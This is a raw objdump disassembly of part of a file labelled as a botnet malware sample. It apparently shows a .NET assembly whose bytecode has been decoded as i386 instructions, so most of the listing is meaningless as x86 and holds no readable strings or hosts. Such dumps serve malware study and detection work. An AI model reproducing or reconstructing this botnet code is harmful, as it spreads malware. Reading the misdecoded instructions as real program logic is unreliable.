
malware_samples/botnet/20a313596d188a01dddf4d99ace74172acb64110b3743c96bb11849f0b52824b.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	10 ba 00 00 00 00    	adc    %bh,0x0(%edx)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 4c 5e 00    	add    %al,0x5e4c00
  402013:	00 8c 5b 00 00 01 00 	add    %cl,0x10000(%ebx,%ebx,2)
  40201a:	00 00                	add    %al,(%eax)
  40201c:	14 00                	adc    $0x0,%al
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	1e                   	push   %ds
  402051:	02 28                	add    (%eax),%ch
  402053:	01 00                	add    %eax,(%eax)
  402055:	00 0a                	add    %cl,(%edx)
  402057:	2a 1e                	sub    (%esi),%bl
  402059:	02 28                	add    (%eax),%ch
  40205b:	04 00                	add    $0x0,%al
  40205d:	00 0a                	add    %cl,(%edx)
  40205f:	2a a6 73 06 00 00    	sub    0x673(%esi),%ah
  402065:	0a 80 01 00 00 04    	or     0x4000001(%eax),%al
  40206b:	73 07                	jae    0x402074
  40206d:	00 00                	add    %al,(%eax)
  40206f:	0a 80 02 00 00 04    	or     0x4000002(%eax),%al
  402075:	73 08                	jae    0x40207f
  402077:	00 00                	add    %al,(%eax)
  402079:	0a 80 03 00 00 04    	or     0x4000003(%eax),%al
  40207f:	73 09                	jae    0x40208a
  402081:	00 00                	add    %al,(%eax)
  402083:	0a 80 04 00 00 04    	or     0x4000004(%eax),%al
  402089:	2a 00                	sub    (%eax),%al
  40208b:	00 13                	add    %dl,(%ebx)
  40208d:	30 01                	xor    %al,(%ecx)
  40208f:	00 0f                	add    %cl,(%edi)
  402091:	00 00                	add    %al,(%eax)
  402093:	00 01                	add    %al,(%ecx)
  402095:	00 00                	add    %al,(%eax)
  402097:	11 7e 01             	adc    %edi,0x1(%esi)
  40209a:	00 00                	add    %al,(%eax)
  40209c:	04 6f                	add    $0x6f,%al
  40209e:	0a 00                	or     (%eax),%al
  4020a0:	00 0a                	add    %cl,(%edx)
  4020a2:	0a 2b                	or     (%ebx),%ch
  4020a4:	00 06                	add    %al,(%esi)
  4020a6:	2a 00                	sub    (%eax),%al
  4020a8:	13 30                	adc    (%eax),%esi
  4020aa:	01 00                	add    %eax,(%eax)
  4020ac:	0f 00 00             	sldt   (%eax)
  4020af:	00 02                	add    %al,(%edx)
  4020b1:	00 00                	add    %al,(%eax)
  4020b3:	11 7e 02             	adc    %edi,0x2(%esi)
  4020b6:	00 00                	add    %al,(%eax)
  4020b8:	04 6f                	add    $0x6f,%al
  4020ba:	0b 00                	or     (%eax),%eax
  4020bc:	00 0a                	add    %cl,(%edx)
  4020be:	0a 2b                	or     (%ebx),%ch
  4020c0:	00 06                	add    %al,(%esi)
  4020c2:	2a 00                	sub    (%eax),%al
  4020c4:	13 30                	adc    (%eax),%esi
  4020c6:	01 00                	add    %eax,(%eax)
  4020c8:	0f 00 00             	sldt   (%eax)
  4020cb:	00 03                	add    %al,(%ebx)
  4020cd:	00 00                	add    %al,(%eax)
  4020cf:	11 7e 03             	adc    %edi,0x3(%esi)
  4020d2:	00 00                	add    %al,(%eax)
  4020d4:	04 6f                	add    $0x6f,%al
  4020d6:	0c 00                	or     $0x0,%al
  4020d8:	00 0a                	add    %cl,(%edx)
  4020da:	0a 2b                	or     (%ebx),%ch
  4020dc:	00 06                	add    %al,(%esi)
  4020de:	2a 00                	sub    (%eax),%al
  4020e0:	13 30                	adc    (%eax),%esi
  4020e2:	01 00                	add    %eax,(%eax)
  4020e4:	0f 00 00             	sldt   (%eax)
  4020e7:	00 04 00             	add    %al,(%eax,%eax,1)
  4020ea:	00 11                	add    %dl,(%ecx)
  4020ec:	7e 04                	jle    0x4020f2
  4020ee:	00 00                	add    %al,(%eax)
  4020f0:	04 6f                	add    $0x6f,%al
  4020f2:	0d 00 00 0a 0a       	or     $0xa0a0000,%eax
  4020f7:	2b 00                	sub    (%eax),%eax
  4020f9:	06                   	push   %es
  4020fa:	2a 00                	sub    (%eax),%al
  4020fc:	13 30                	adc    (%eax),%esi
  4020fe:	02 00                	add    (%eax),%al
  402100:	11 00                	adc    %eax,(%eax)
  402102:	00 00                	add    %al,(%eax)
  402104:	05 00 00 11 02       	add    $0x2110000,%eax
  402109:	03 28                	add    (%eax),%ebp
  40210b:	11 00                	adc    %eax,(%eax)
  40210d:	00 0a                	add    %cl,(%edx)
  40210f:	28 12                	sub    %dl,(%edx)
  402111:	00 00                	add    %al,(%eax)
  402113:	0a 0a                	or     (%edx),%cl
  402115:	2b 00                	sub    (%eax),%eax
  402117:	06                   	push   %es
  402118:	2a 00                	sub    (%eax),%al
  40211a:	00 00                	add    %al,(%eax)
  40211c:	13 30                	adc    (%eax),%esi
  40211e:	01 00                	add    %eax,(%eax)
  402120:	0b 00                	or     (%eax),%eax
  402122:	00 00                	add    %al,(%eax)
  402124:	06                   	push   %es
  402125:	00 00                	add    %al,(%eax)
  402127:	11 02                	adc    %eax,(%edx)
  402129:	28 13                	sub    %dl,(%ebx)
  40212b:	00 00                	add    %al,(%eax)
  40212d:	0a 0a                	or     (%edx),%cl
  40212f:	2b 00                	sub    (%eax),%eax
  402131:	06                   	push   %es
  402132:	2a 00                	sub    (%eax),%al
  402134:	13 30                	adc    (%eax),%esi
  402136:	01 00                	add    %eax,(%eax)
  402138:	0f 00 00             	sldt   (%eax)
  40213b:	00 07                	add    %al,(%edi)
  40213d:	00 00                	add    %al,(%eax)
  40213f:	11 d0                	adc    %edx,%eax
  402141:	05 00 00 02 28       	add    $0x28020000,%eax
  402146:	14 00                	adc    $0x0,%al
  402148:	00 0a                	add    %cl,(%edx)
  40214a:	0a 2b                	or     (%ebx),%ch
  40214c:	00 06                	add    %al,(%esi)
  40214e:	2a 00                	sub    (%eax),%al
  402150:	13 30                	adc    (%eax),%esi
  402152:	01 00                	add    %eax,(%eax)
  402154:	0b 00                	or     (%eax),%eax
  402156:	00 00                	add    %al,(%eax)
  402158:	08 00                	or     %al,(%eax)
  40215a:	00 11                	add    %dl,(%ecx)
  40215c:	02 28                	add    (%eax),%ch
  40215e:	15 00 00 0a 0a       	adc    $0xa0a0000,%eax
  402163:	2b 00                	sub    (%eax),%eax
  402165:	06                   	push   %es
  402166:	2a 00                	sub    (%eax),%al
  402168:	13 30                	adc    (%eax),%esi
  40216a:	01 00                	add    %eax,(%eax)
  40216c:	18 00                	sbb    %al,(%eax)
  40216e:	00 00                	add    %al,(%eax)
  402170:	09 00                	or     %eax,(%eax)
  402172:	00 11                	add    %dl,(%ecx)
  402174:	02 8c 01 00 00 1b 2d 	add    0x2d1b0000(%ecx,%eax,1),%cl
  40217b:	0a 28                	or     (%eax),%ch
  40217d:	01 00                	add    %eax,(%eax)
  40217f:	00 2b                	add    %ch,(%ebx)
  402181:	0a 2b                	or     (%ebx),%ch
  402183:	06                   	push   %es
  402184:	2b 04 02             	sub    (%edx,%eax,1),%eax
  402187:	0a 2b                	or     (%ebx),%ch
  402189:	00 06                	add    %al,(%esi)
  40218b:	2a 13                	sub    (%ebx),%dl
  40218d:	30 02                	xor    %al,(%edx)
  40218f:	00 10                	add    %dl,(%eax)
  402191:	00 00                	add    %al,(%eax)
  402193:	00 0a                	add    %cl,(%edx)
  402195:	00 00                	add    %al,(%eax)
  402197:	11 03                	adc    %eax,(%ebx)
  402199:	12 00                	adc    (%eax),%al
  40219b:	fe                   	(bad)
  40219c:	15 02 00 00 1b       	adc    $0x1b000002,%eax
  4021a1:	06                   	push   %es
  4021a2:	81 02 00 00 1b 2a    	addl   $0x2a1b0000,(%edx)
  4021a8:	1e                   	push   %ds
  4021a9:	02 28                	add    (%eax),%ch
  4021ab:	17                   	pop    %ss
  4021ac:	00 00                	add    %al,(%eax)
  4021ae:	0a 2a                	or     (%edx),%ch
  4021b0:	13 30                	adc    (%eax),%esi
  4021b2:	01 00                	add    %eax,(%eax)
  4021b4:	20 00                	and    %al,(%eax)
  4021b6:	00 00                	add    %al,(%eax)
  4021b8:	0b 00                	or     (%eax),%eax
  4021ba:	00 11                	add    %dl,(%ecx)
  4021bc:	7e 19                	jle    0x4021d7
  4021be:	00 00                	add    %al,(%eax)
  4021c0:	0a 8c 03 00 00 1b 2d 	or     0x2d1b0000(%ebx,%eax,1),%cl
  4021c7:	0a 28                	or     (%eax),%ch
  4021c9:	02 00                	add    (%eax),%al
  4021cb:	00 2b                	add    %ch,(%ebx)
  4021cd:	80 19 00             	sbbb   $0x0,(%ecx)
  4021d0:	00 0a                	add    %cl,(%edx)
  4021d2:	7e 19                	jle    0x4021ed
  4021d4:	00 00                	add    %al,(%eax)
  4021d6:	0a 0a                	or     (%edx),%cl
  4021d8:	2b 00                	sub    (%eax),%eax
  4021da:	06                   	push   %es
  4021db:	2a 1e                	sub    (%esi),%bl
  4021dd:	02 28                	add    (%eax),%ch
  4021df:	17                   	pop    %ss
  4021e0:	00 00                	add    %al,(%eax)
  4021e2:	0a 2a                	or     (%edx),%ch
  4021e4:	13 30                	adc    (%eax),%esi
  4021e6:	02 00                	add    (%eax),%al
  4021e8:	83 00 00             	addl   $0x0,(%eax)
  4021eb:	00 00                	add    %al,(%eax)
  4021ed:	00 00                	add    %al,(%eax)
  4021ef:	00 72 01             	add    %dh,0x1(%edx)
  4021f2:	00 00                	add    %al,(%eax)
  4021f4:	70 80                	jo     0x402176
  4021f6:	06                   	push   %es
  4021f7:	00 00                	add    %al,(%eax)
  4021f9:	04 72                	add    $0x72,%al
  4021fb:	5b                   	pop    %ebx
  4021fc:	00 00                	add    %al,(%eax)
  4021fe:	70 80                	jo     0x402180
  402200:	08 00                	or     %al,(%eax)
  402202:	00 04 72             	add    %al,(%edx,%esi,2)
  402205:	8d 00                	lea    (%eax),%eax
  402207:	00 70 80             	add    %dh,-0x80(%eax)
  40220a:	09 00                	or     %eax,(%eax)
  40220c:	00 04 72             	add    %al,(%edx,%esi,2)
  40220f:	bf 00 00 70 80       	mov    $0x80700000,%edi
  402214:	0a 00                	or     (%eax),%al
  402216:	00 04 72             	add    %al,(%edx,%esi,2)
  402219:	f1                   	int1
  40221a:	00 00                	add    %al,(%eax)
  40221c:	70 28                	jo     0x402246
  40221e:	1d 00 00 0a 80       	sbb    $0x800a0000,%eax
  402223:	0b 00                	or     (%eax),%eax
  402225:	00 04 72             	add    %al,(%edx,%esi,2)
  402228:	f5                   	cmc
  402229:	00 00                	add    %al,(%eax)
  40222b:	70 80                	jo     0x4021ad
  40222d:	0c 00                	or     $0x0,%al
  40222f:	00 04 72             	add    %al,(%edx,%esi,2)
  402232:	4f                   	dec    %edi
  402233:	01 00                	add    %eax,(%eax)
  402235:	70 80                	jo     0x4021b7
  402237:	0d 00 00 04 72       	or     $0x72040000,%eax
  40223c:	81 01 00 70 80 0e    	addl   $0xe807000,(%ecx)
  402242:	00 00                	add    %al,(%eax)
  402244:	04 72                	add    $0x72,%al
  402246:	b3 01                	mov    $0x1,%bl
  402248:	00 70 80             	add    %dh,-0x80(%eax)
  40224b:	0f 00 00             	sldt   (%eax)
  40224e:	04 72                	add    $0x72,%al
  402250:	e5 01                	in     $0x1,%eax
  402252:	00 70 80             	add    %dh,-0x80(%eax)
  402255:	10 00                	adc    %al,(%eax)
  402257:	00 04 72             	add    %al,(%edx,%esi,2)
  40225a:	07                   	pop    %es
  40225b:	02 00                	add    (%eax),%al
  40225d:	70 28                	jo     0x402287
  40225f:	1e                   	push   %ds
  402260:	00 00                	add    %al,(%eax)
  402262:	0a 72 11             	or     0x11(%edx),%dh
  402265:	02 00                	add    (%eax),%al
  402267:	70 28                	jo     0x402291
  402269:	1f                   	pop    %ds
  40226a:	00 00                	add    %al,(%eax)
  40226c:	0a 80 11 00 00 04    	or     0x4000011(%eax),%al
  402272:	2a 00                	sub    (%eax),%al
  402274:	1e                   	push   %ds
  402275:	02 28                	add    (%eax),%ch
  402277:	17                   	pop    %ss
  402278:	00 00                	add    %al,(%eax)
  40227a:	0a 2a                	or     (%edx),%ch
  40227c:	1e                   	push   %ds
  40227d:	02 28                	add    (%eax),%ch
  40227f:	17                   	pop    %ss
  402280:	00 00                	add    %al,(%eax)
  402282:	0a 2a                	or     (%edx),%ch
  402284:	1b 30                	sbb    (%eax),%esi
  402286:	09 00                	or     %eax,(%eax)
  402288:	e4 03                	in     $0x3,%al
  40228a:	00 00                	add    %al,(%eax)
  40228c:	0c 00                	or     $0x0,%al
  40228e:	00 11                	add    %dl,(%ecx)
  402290:	7e 0b                	jle    0x40229d
  402292:	00 00                	add    %al,(%eax)
  402294:	04 20                	add    $0x20,%al
  402296:	e8 03 00 00 d8       	call   0xd840229e
  40229b:	28 22                	sub    %ah,(%edx)
  40229d:	00 00                	add    %al,(%eax)
  40229f:	0a 7e 06             	or     0x6(%esi),%bh
  4022a2:	00 00                	add    %al,(%eax)
  4022a4:	04 28                	add    $0x28,%al
  4022a6:	5f                   	pop    %edi
  4022a7:	00 00                	add    %al,(%eax)
  4022a9:	06                   	push   %es
  4022aa:	28 23                	sub    %ah,(%ebx)
  4022ac:	00 00                	add    %al,(%eax)
  4022ae:	0a 80 06 00 00 04    	or     0x4000006(%eax),%al
  4022b4:	7e 08                	jle    0x4022be
  4022b6:	00 00                	add    %al,(%eax)
  4022b8:	04 28                	add    $0x28,%al
  4022ba:	5f                   	pop    %edi
  4022bb:	00 00                	add    %al,(%eax)
  4022bd:	06                   	push   %es
  4022be:	28 23                	sub    %ah,(%ebx)
  4022c0:	00 00                	add    %al,(%eax)
  4022c2:	0a 80 08 00 00 04    	or     0x4000008(%eax),%al
  4022c8:	7e 09                	jle    0x4022d3
  4022ca:	00 00                	add    %al,(%eax)
  4022cc:	04 28                	add    $0x28,%al
  4022ce:	5f                   	pop    %edi
  4022cf:	00 00                	add    %al,(%eax)
  4022d1:	06                   	push   %es
  4022d2:	28 23                	sub    %ah,(%ebx)
  4022d4:	00 00                	add    %al,(%eax)
  4022d6:	0a 80 09 00 00 04    	or     0x4000009(%eax),%al
  4022dc:	7e 0a                	jle    0x4022e8
  4022de:	00 00                	add    %al,(%eax)
  4022e0:	04 28                	add    $0x28,%al
  4022e2:	5f                   	pop    %edi
  4022e3:	00 00                	add    %al,(%eax)
  4022e5:	06                   	push   %es
  4022e6:	28 23                	sub    %ah,(%ebx)
  4022e8:	00 00                	add    %al,(%eax)
  4022ea:	0a 80 0a 00 00 04    	or     0x400000a(%eax),%al
  4022f0:	7e 0c                	jle    0x4022fe
  4022f2:	00 00                	add    %al,(%eax)
  4022f4:	04 28                	add    $0x28,%al
  4022f6:	5f                   	pop    %edi
  4022f7:	00 00                	add    %al,(%eax)
  4022f9:	06                   	push   %es
  4022fa:	28 23                	sub    %ah,(%ebx)
  4022fc:	00 00                	add    %al,(%eax)
  4022fe:	0a 80 0c 00 00 04    	or     0x400000c(%eax),%al
  402304:	7e 0d                	jle    0x402313
  402306:	00 00                	add    %al,(%eax)
  402308:	04 28                	add    $0x28,%al
  40230a:	5f                   	pop    %edi
  40230b:	00 00                	add    %al,(%eax)
  40230d:	06                   	push   %es
  40230e:	28 23                	sub    %ah,(%ebx)
  402310:	00 00                	add    %al,(%eax)
  402312:	0a 80 0d 00 00 04    	or     0x400000d(%eax),%al
  402318:	7e 0e                	jle    0x402328
  40231a:	00 00                	add    %al,(%eax)
  40231c:	04 28                	add    $0x28,%al
  40231e:	5f                   	pop    %edi
  40231f:	00 00                	add    %al,(%eax)
  402321:	06                   	push   %es
  402322:	28 23                	sub    %ah,(%ebx)
  402324:	00 00                	add    %al,(%eax)
  402326:	0a 28                	or     (%eax),%ch
  402328:	24 00                	and    $0x0,%al
  40232a:	00 0a                	add    %cl,(%edx)
  40232c:	80 0e 00             	orb    $0x0,(%esi)
  40232f:	00 04 7e             	add    %al,(%esi,%edi,2)
  402332:	0f 00 00             	sldt   (%eax)
  402335:	04 28                	add    $0x28,%al
  402337:	5f                   	pop    %edi
  402338:	00 00                	add    %al,(%eax)
  40233a:	06                   	push   %es
  40233b:	28 23                	sub    %ah,(%ebx)
  40233d:	00 00                	add    %al,(%eax)
  40233f:	0a 80 0f 00 00 04    	or     0x400000f(%eax),%al
  402345:	de 14 25 28 25 00 00 	ficoms 0x2528(,%eiz,1)
  40234c:	0a 0d 16 28 26 00    	or     0x262816,%cl
  402352:	00 0a                	add    %cl,(%edx)
  402354:	28 27                	sub    %ah,(%edi)
  402356:	00 00                	add    %al,(%eax)
  402358:	0a de                	or     %dh,%bl
  40235a:	00 28                	add    %ch,(%eax)
  40235c:	76 00                	jbe    0x40235e
  40235e:	00 06                	add    %al,(%esi)
  402360:	2d 06 16 28 26       	sub    $0x26281606,%eax
  402365:	00 00                	add    %al,(%eax)
  402367:	0a 28                	or     (%eax),%ch
  402369:	16                   	push   %ss
  40236a:	00 00                	add    %al,(%eax)
  40236c:	06                   	push   %es
  40236d:	de 0f                	fimuls (%edi)
  40236f:	25 28 25 00 00       	and    $0x2528,%eax
  402374:	0a 13                	or     (%ebx),%dl
  402376:	04 28                	add    $0x28,%al
  402378:	27                   	daa
  402379:	00 00                	add    %al,(%eax)
  40237b:	0a de                	or     %dh,%bl
  40237d:	00 28                	add    %ch,(%eax)
  40237f:	15 00 00 06 7e       	adc    $0x7e060000,%eax
  402384:	0e                   	push   %cs
  402385:	00 00                	add    %al,(%eax)
  402387:	04 72                	add    $0x72,%al
  402389:	23 02                	and    (%edx),%eax
  40238b:	00 70 7e             	add    %dh,0x7e(%eax)
  40238e:	0f 00 00             	sldt   (%eax)
  402391:	04 28                	add    $0x28,%al
  402393:	28 00                	sub    %al,(%eax)
  402395:	00 0a                	add    %cl,(%edx)
  402397:	0a 06                	or     (%esi),%al
  402399:	73 29                	jae    0x4023c4
  40239b:	00 00                	add    %al,(%eax)
  40239d:	0a 6f 2a             	or     0x2a(%edi),%ch
  4023a0:	00 00                	add    %al,(%eax)
  4023a2:	0a 6f 2b             	or     0x2b(%edi),%ch
  4023a5:	00 00                	add    %al,(%eax)
  4023a7:	0a 13                	or     (%ebx),%dl
  4023a9:	05 11 05 28 23       	add    $0x23280511,%eax
  4023ae:	00 00                	add    %al,(%eax)
  4023b0:	0a 28                	or     (%eax),%ch
  4023b2:	2c 00                	sub    $0x0,%al
  4023b4:	00 0a                	add    %cl,(%edx)
  4023b6:	2d 0d 11 05 28       	sub    $0x2805110d,%eax
  4023bb:	23 00                	and    (%eax),%eax
  4023bd:	00 0a                	add    %cl,(%edx)
  4023bf:	28 2d 00 00 0a 26    	sub    %ch,0x260a0000
  4023c5:	06                   	push   %es
  4023c6:	28 2e                	sub    %ch,(%esi)
  4023c8:	00 00                	add    %al,(%eax)
  4023ca:	0a 2c 0f             	or     (%edi,%ecx,1),%ch
  4023cd:	06                   	push   %es
  4023ce:	73 29                	jae    0x4023f9
  4023d0:	00 00                	add    %al,(%eax)
  4023d2:	0a 13                	or     (%ebx),%dl
  4023d4:	06                   	push   %es
  4023d5:	11 06                	adc    %eax,(%esi)
  4023d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d8:	2f                   	das
  4023d9:	00 00                	add    %al,(%eax)
  4023db:	0a 20                	or     (%eax),%ah
  4023dd:	e8 03 00 00 28       	call   0x284023e5
  4023e2:	22 00                	and    (%eax),%al
  4023e4:	00 0a                	add    %cl,(%edx)
  4023e6:	06                   	push   %es
  4023e7:	7e 2c                	jle    0x402415
  4023e9:	00 00                	add    %al,(%eax)
  4023eb:	04 28                	add    $0x28,%al
  4023ed:	30 00                	xor    %al,(%eax)
  4023ef:	00 0a                	add    %cl,(%edx)
  4023f1:	28 31                	sub    %dh,(%ecx)
  4023f3:	00 00                	add    %al,(%eax)
  4023f5:	0a de                	or     %dh,%bl
  4023f7:	0f 25                	(bad)
  4023f9:	28 25 00 00 0a 13    	sub    %ah,0x130a0000
  4023ff:	07                   	pop    %es
  402400:	28 27                	sub    %ah,(%edi)
  402402:	00 00                	add    %al,(%eax)
  402404:	0a de                	or     %dh,%bl
  402406:	00 72 27             	add    %dh,0x27(%edx)
  402409:	02 00                	add    (%eax),%al
  40240b:	70 73                	jo     0x402480
  40240d:	32 00                	xor    (%eax),%al
  40240f:	00 0a                	add    %cl,(%edx)
  402411:	13 09                	adc    (%ecx),%ecx
  402413:	11 09                	adc    %ecx,(%ecx)
  402415:	17                   	pop    %ss
  402416:	6f                   	outsl  %ds:(%esi),(%dx)
  402417:	33 00                	xor    (%eax),%eax
  402419:	00 0a                	add    %cl,(%edx)
  40241b:	28 28                	sub    %ch,(%eax)
  40241d:	00 00                	add    %al,(%eax)
  40241f:	06                   	push   %es
  402420:	28 34 00             	sub    %dh,(%eax,%eax,1)
  402423:	00 0a                	add    %cl,(%edx)
  402425:	2c 46                	sub    $0x46,%al
  402427:	11 09                	adc    %ecx,(%ecx)
  402429:	1b 8d 26 00 00 01    	sbb    0x1000026(%ebp),%ecx
  40242f:	13 0e                	adc    (%esi),%ecx
  402431:	11 0e                	adc    %ecx,(%esi)
  402433:	16                   	push   %ss
  402434:	72 41                	jb     0x402477
  402436:	02 00                	add    (%eax),%al
  402438:	70 a2                	jo     0x4023dc
  40243a:	11 0e                	adc    %ecx,(%esi)
  40243c:	17                   	pop    %ss
  40243d:	7e 0f                	jle    0x40244e
  40243f:	00 00                	add    %al,(%eax)
  402441:	04 28                	add    $0x28,%al
  402443:	35 00 00 0a a2       	xor    $0xa20a0000,%eax
  402448:	11 0e                	adc    %ecx,(%esi)
  40244a:	18 72 9d             	sbb    %dh,-0x63(%edx)
  40244d:	02 00                	add    (%eax),%al
  40244f:	70 a2                	jo     0x4023f3
  402451:	11 0e                	adc    %ecx,(%esi)
  402453:	19 06                	sbb    %eax,(%esi)
  402455:	a2 11 0e 1a 72       	mov    %al,0x721a0e11
  40245a:	ad                   	lods   %ds:(%esi),%eax
  40245b:	02 00                	add    (%eax),%al
  40245d:	70 a2                	jo     0x402401
  40245f:	11 0e                	adc    %ecx,(%esi)
  402461:	28 36                	sub    %dh,(%esi)
  402463:	00 00                	add    %al,(%eax)
  402465:	0a 6f 37             	or     0x37(%edi),%ch
  402468:	00 00                	add    %al,(%eax)
  40246a:	0a 2b                	or     (%ebx),%ch
  40246c:	44                   	inc    %esp
  40246d:	11 09                	adc    %ecx,(%ecx)
  40246f:	1b 8d 26 00 00 01    	sbb    0x1000026(%ebp),%ecx
  402475:	13 0e                	adc    (%esi),%ecx
  402477:	11 0e                	adc    %ecx,(%esi)
  402479:	16                   	push   %ss
  40247a:	72 b1                	jb     0x40242d
  40247c:	02 00                	add    (%eax),%al
  40247e:	70 a2                	jo     0x402422
  402480:	11 0e                	adc    %ecx,(%esi)
  402482:	17                   	pop    %ss
  402483:	7e 0f                	jle    0x402494
  402485:	00 00                	add    %al,(%eax)
  402487:	04 28                	add    $0x28,%al
  402489:	35 00 00 0a a2       	xor    $0xa20a0000,%eax
  40248e:	11 0e                	adc    %ecx,(%esi)
  402490:	18 72 9d             	sbb    %dh,-0x63(%edx)
  402493:	02 00                	add    (%eax),%al
  402495:	70 a2                	jo     0x402439
  402497:	11 0e                	adc    %ecx,(%esi)
  402499:	19 06                	sbb    %eax,(%esi)
  40249b:	a2 11 0e 1a 72       	mov    %al,0x721a0e11
  4024a0:	ad                   	lods   %ds:(%esi),%eax
  4024a1:	02 00                	add    (%eax),%al
  4024a3:	70 a2                	jo     0x402447
  4024a5:	11 0e                	adc    %ecx,(%esi)
  4024a7:	28 36                	sub    %dh,(%esi)
  4024a9:	00 00                	add    %al,(%eax)
  4024ab:	0a 6f 37             	or     0x37(%edi),%ch
  4024ae:	00 00                	add    %al,(%eax)
  4024b0:	0a 11                	or     (%ecx),%dl
  4024b2:	09 28                	or     %ebp,(%eax)
  4024b4:	38 00                	cmp    %al,(%eax)
  4024b6:	00 0a                	add    %cl,(%edx)
  4024b8:	13 08                	adc    (%eax),%ecx
  4024ba:	11 08                	adc    %ecx,(%eax)
  4024bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4024bd:	39 00                	cmp    %eax,(%eax)
  4024bf:	00 0a                	add    %cl,(%edx)
  4024c1:	de 0f                	fimuls (%edi)
  4024c3:	25 28 25 00 00       	and    $0x2528,%eax
  4024c8:	0a 13                	or     (%ebx),%dl
  4024ca:	0a 28                	or     (%eax),%ch
  4024cc:	27                   	daa
  4024cd:	00 00                	add    %al,(%eax)
  4024cf:	0a de                	or     %dh,%bl
  4024d1:	00 28                	add    %ch,(%eax)
  4024d3:	04 00                	add    $0x0,%al
  4024d5:	00 06                	add    %al,(%esi)
  4024d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4024d8:	3a 00                	cmp    (%eax),%al
  4024da:	00 0a                	add    %cl,(%edx)
  4024dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4024dd:	3b 00                	cmp    (%eax),%eax
  4024df:	00 0a                	add    %cl,(%edx)
  4024e1:	72 f5                	jb     0x4024d8
  4024e3:	02 00                	add    (%eax),%al
  4024e5:	70 17                	jo     0x4024fe
  4024e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4024e8:	3c 00                	cmp    $0x0,%al
  4024ea:	00 0a                	add    %cl,(%edx)
  4024ec:	7e 0f                	jle    0x4024fd
  4024ee:	00 00                	add    %al,(%eax)
  4024f0:	04 28                	add    $0x28,%al
  4024f2:	35 00 00 0a 06       	xor    $0x60a0000,%eax
  4024f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4024f8:	3d 00 00 0a de       	cmp    $0xde0a0000,%eax
  4024fd:	0f 25                	(bad)
  4024ff:	28 25 00 00 0a 13    	sub    %ah,0x130a0000
  402505:	0b 28                	or     (%eax),%ebp
  402507:	27                   	daa
  402508:	00 00                	add    %al,(%eax)
  40250a:	0a de                	or     %dh,%bl
  40250c:	00 1d 28 3e 00 00    	add    %bl,0x3e28
  402512:	0a 72 23             	or     0x23(%edx),%dh
  402515:	02 00                	add    (%eax),%al
  402517:	70 7e                	jo     0x402597
  402519:	0f 00 00             	sldt   (%eax)
  40251c:	04 28                	add    $0x28,%al
  40251e:	35 00 00 0a 72       	xor    $0x720a0000,%eax
  402523:	51                   	push   %ecx
  402524:	03 00                	add    (%eax),%eax
  402526:	70 28                	jo     0x402550
  402528:	3f                   	aas
  402529:	00 00                	add    %al,(%eax)
  40252b:	0a 13                	or     (%ebx),%dl
  40252d:	0c 72                	or     $0x72,%al
  40252f:	5b                   	pop    %ebx
  402530:	03 00                	add    (%eax),%eax
  402532:	70 72                	jo     0x4025a6
  402534:	77 03                	ja     0x402539
  402536:	00 70 28             	add    %dh,0x28(%eax)
  402539:	40                   	inc    %eax
  40253a:	00 00                	add    %al,(%eax)
  40253c:	0a 14 72             	or     (%edx,%esi,2),%dl
  40253f:	79 03                	jns    0x402544
  402541:	00 70 17             	add    %dh,0x17(%eax)
  402544:	8d 03                	lea    (%ebx),%eax
  402546:	00 00                	add    %al,(%eax)
  402548:	01 13                	add    %edx,(%ebx)
  40254a:	0f 11 0f             	movups %xmm1,(%edi)
  40254d:	16                   	push   %ss
  40254e:	11 0c a2             	adc    %ecx,(%edx,%eiz,4)
  402551:	11 0f                	adc    %ecx,(%edi)
  402553:	13 10                	adc    (%eax),%edx
  402555:	11 10                	adc    %edx,(%eax)
  402557:	14 14                	adc    $0x14,%al
  402559:	17                   	pop    %ss
  40255a:	8d 38                	lea    (%eax),%edi
  40255c:	00 00                	add    %al,(%eax)
  40255e:	01 13                	add    %edx,(%ebx)
  402560:	11 11                	adc    %edx,(%ecx)
  402562:	11 16                	adc    %edx,(%esi)
  402564:	17                   	pop    %ss
  402565:	9c                   	pushf
  402566:	11 11                	adc    %edx,(%ecx)
  402568:	28 41 00             	sub    %al,0x0(%ecx)
  40256b:	00 0a                	add    %cl,(%edx)
  40256d:	11 11                	adc    %edx,(%ecx)
  40256f:	16                   	push   %ss
  402570:	90                   	nop
  402571:	2c 1f                	sub    $0x1f,%al
  402573:	11 10                	adc    %edx,(%eax)
  402575:	16                   	push   %ss
  402576:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  40257d:	26 00 00             	add    %al,%es:(%eax)
  402580:	01 28                	add    %ebp,(%eax)
  402582:	14 00                	adc    $0x0,%al
  402584:	00 0a                	add    %cl,(%edx)
  402586:	28 42 00             	sub    %al,0x0(%edx)
  402589:	00 0a                	add    %cl,(%edx)
  40258b:	74 26                	je     0x4025b3
  40258d:	00 00                	add    %al,(%eax)
  40258f:	01 13                	add    %edx,(%ebx)
  402591:	0c 13                	or     $0x13,%al
  402593:	12 11                	adc    (%ecx),%dl
  402595:	12 14 72             	adc    (%edx,%esi,2),%dl
  402598:	97                   	xchg   %eax,%edi
  402599:	03 00                	add    (%eax),%eax
  40259b:	70 17                	jo     0x4025b4
  40259d:	8d 03                	lea    (%ebx),%eax
  40259f:	00 00                	add    %al,(%eax)
  4025a1:	01 13                	add    %edx,(%ebx)
  4025a3:	13 11                	adc    (%ecx),%edx
  4025a5:	13 16                	adc    (%esi),%edx
  4025a7:	06                   	push   %es
  4025a8:	a2 11 13 14 14       	mov    %al,0x14141311
  4025ad:	16                   	push   %ss
  4025ae:	17                   	pop    %ss
  4025af:	28 43 00             	sub    %al,0x0(%ebx)
  4025b2:	00 0a                	add    %cl,(%edx)
  4025b4:	11 12                	adc    %edx,(%edx)
  4025b6:	14 72                	adc    $0x72,%al
  4025b8:	ad                   	lods   %ds:(%esi),%eax
  4025b9:	03 00                	add    (%eax),%eax
  4025bb:	70 17                	jo     0x4025d4
  4025bd:	8d 03                	lea    (%ebx),%eax
  4025bf:	00 00                	add    %al,(%eax)
  4025c1:	01 13                	add    %edx,(%ebx)
